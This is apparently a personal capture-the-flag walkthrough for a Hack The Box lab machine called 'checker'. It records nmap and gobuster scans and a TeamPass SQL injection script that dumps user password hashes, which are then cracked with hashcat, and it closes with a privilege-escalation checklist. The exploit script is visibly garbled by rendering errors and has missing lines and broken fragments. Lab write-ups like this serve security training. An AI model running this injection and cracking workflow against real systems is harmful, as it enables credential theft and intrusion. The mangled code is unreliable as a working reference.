
- ping machine
    - `ping ###.###.###.###`
        
         `✘ kali@kali  ~/htb/cozyhosting  ping 10.10.11.56 PING 10.10.11.56 (10.10.11.56) 56(84) bytes of data. 64 bytes from 10.10.11.56: icmp_seq=1 ttl=63 time=44.5 ms 64 bytes from 10.10.11.56: icmp_seq=2 ttl=63 time=41.4 ms 64 bytes from 10.10.11.56: icmp_seq=3 ttl=63 time=41.8 ms ^C --- 10.10.11.56 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2003ms rtt min/avg/max/mdev = 41.397/42.570/44.529/1.394 ms`
        
- nmap for open ports
    
    - `nmap -p- -T4 --open -Pn -vvv ###.###.###.### -oN nameNmap.txt`
    - or ''
        
         `kali@kali  ~/htb/cozyhosting  nmap -p- -T4 --open -Pn -vvv checker.htb -oN checkerNmap.txt   Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 14:13 EST Initiating SYN Stealth Scan at 14:13 Scanning checker.htb (10.10.11.56) [65535 ports] Discovered open port 80/tcp on 10.10.11.56 Discovered open port 22/tcp on 10.10.11.56 Discovered open port 8080/tcp on 10.10.11.56 Completed SYN Stealth Scan at 14:13, 13.46s elapsed (65535 total ports) Nmap scan report for checker.htb (10.10.11.56) Host is up, received user-set (0.14s latency). Scanned at 2025-02-22 14:13:35 EST for 13s Not shown: 65532 closed tcp ports (reset) PORT     STATE SERVICE    REASON 22/tcp   open  ssh        syn-ack ttl 63 80/tcp   open  http       syn-ack ttl 63 8080/tcp open  http-proxy syn-ack ttl 63  Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds            Raw packets sent: 65868 (2.898MB) | Rcvd: 65660 (2.626MB)`
        
- nmap for services and versions running on open ports
    
    - `nmap -p port#, port#, port# -sC -sV ###.###.###.### -oN nameServicesVersionsNmap`
        
         `kali@kali  ~/htb/cozyhosting  nmap -p 22,80,8080 -sC -sV checker.htb -oN checkerServicesVersionsNmap  Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 14:53 EST Nmap scan report for checker.htb (10.10.11.56) Host is up (0.070s latency).  PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA) |_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519) 80/tcp   open  http    Apache httpd |_http-server-header: Apache |_http-title: 403 Forbidden 8080/tcp open  http    Apache httpd |_http-server-header: Apache |_http-title: 403 Forbidden Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds`
        
- Gobuster to enumerate website if machine has 80 or 443
    
    - `gobuster dir -u http://checker.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
    - but we get 403 error - 403 Forbidden error means that the server understands a request but is denying access to the requested resource
    - ```bash ✘ kali@kali  ~/htb/checker  gobuster dir -u http://checker.htb -w /usr/share/seclists/Discovery/Web-Content/di rectory-list-lowercase-2.3-small.txt -n -o checkerGobuster.txt -t 10  
        ===============================================================  
        Gobuster v3.6  
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
        ===============================================================  
        [+] Url: http://checker.htb  
        [+] Method: GET  
        [+] Threads: 10  
        [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  
        [+] Negative Status codes: 404  
        [+] User Agent: gobuster/3.6  
        [+] No status: true  
        [+] Timeout: 10s  
        ===============================================================  
        Starting gobuster in directory enumeration mode  
        ===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://checker.h tb/dc758432-1f2a-41aa-89c5-c1fa34001b93 => 403 (Length: 199). To continue please exclude the status code or the l ength

    `- excluding 403's gets gobuster to run but then throws 429's "Too many request" error. A server imposed rate limit that'w meant to slow down request rates.     ```bash  ✘ kali@kali  ~/htb/checker  gobuster dir -u http://checker.htb -w /usr/share/seclists/Discovery/Web-Content/di rectory-list-lowercase-2.3-small.txt -b 403 -o checkerGobuster.txt -t 10  =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url:                     http://checker.htb [+] Method:                  GET [+] Threads:                 10 [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt [+] Negative Status codes:   403 [+] User Agent:              gobuster/3.6 [+] Timeout:                 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /legal                (Status: 429) [Size: 227] /30                   (Status: 429) [Size: 227] /xml                  (Status: 429) [Size: 227] /banners              (Status: 429) [Size: 227] /29                   (Status: 429) [Size: 227] /projects             (Status: 429) [Size: 227] /7                    (Status: 429) [Size: 227] /tools                (Status: 429) [Size: 227] /28                   (Status: 429) [Size: 227]`

- 2 websites exist at 80 and 8080
- ![Pasted image 20250222160046.png](https://theo2612.github.io/NewObsidian/Pasted%20image%2020250222160046.png)
- ![Pasted image 20250222160752.png](https://theo2612.github.io/NewObsidian/Pasted%20image%2020250222160752.png)

- Searching for teampass exploits reveals a SQL injection
    
    - https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612
    
    ```bash if [ "$#" -lt 1 ]; then echo "Usage: $0 " exit 1 fi
    

vulnerable_url="$1/api/index.php/authorize"

check=

vulnerable_url") if echo "$check" | grep -q "API usage is not allowed"; then echo "API feature is not enabled :-(" exit 1 fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'[¶](https://theo2612.github.io/NewObsidian/Certifications%20and%20courses/OSCP%20HTB%20boxes/checker/#htpasswd-bnbc-10-h4ck3d-tr-d-n "Permanent link")

arbitrary_hash='

10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() { inject="none' UNION SELECT id, '

1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin" data="{\"login\":\""Extra close brace or missing open brace(curl --silent --header "Content-Type: application/json" -X POST --data "

vulnerable_url" | jq -r '.token') echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key') }

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do username=\((exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT

(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT

username: (password" done

    ``- drop below POC into teampassExploit.sh     - `chmod +x teampassExploit.sh`     ```bash  kali@kali  ~/htb/checker  ./teampassExploit.sh http://checker.htb:8080                                         There are 2 users in the system:                                                                                  admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya                                               bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy``   

- Drop both hashes into a text file and remove admin and bob from the file ```bash kali@kali  ~/htb/checker  cat hashes.txt 10\)lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya 10\)yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy

    `- run the hashes through hashcat         - and we get bob's hash to crack - p/w cheerleader         - This is bob's password for teampass     ```bash      kali@kali  ~/htb/checker  hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt  hashcat (v6.2.6) starting  OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================================ * Device #1: cpu-penryn-QEMU Virtual CPU version 2.5+, 2822/5709 MB (1024 MB allocatable), 6MCU  Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 72  Hashes: 2 digests; 2 unique digests, 2 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1  Optimizers applied: * Zero-Byte  Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled.  Host memory required for this attack: 0 MB  Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385  $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>` 

- bookstack login is under password side tab -

- search for exploits, RCEs, etc on service's versions running on those open ports
    
    - SearchSploit
    - Metaspolit
    - document
- Foothold - Look around and check things out for a second
    
    - search local directory
    - search root directory
    - sudo -l
    - look for exploitable binary's
        
        ## - `$ find / -perm /4000 2>/dev/null'[](https://theo2612.github.io/NewObsidian/Certifications%20and%20courses/OSCP%20HTB%20boxes/checker/#-find-perm-4000-2devnull "Permanent link")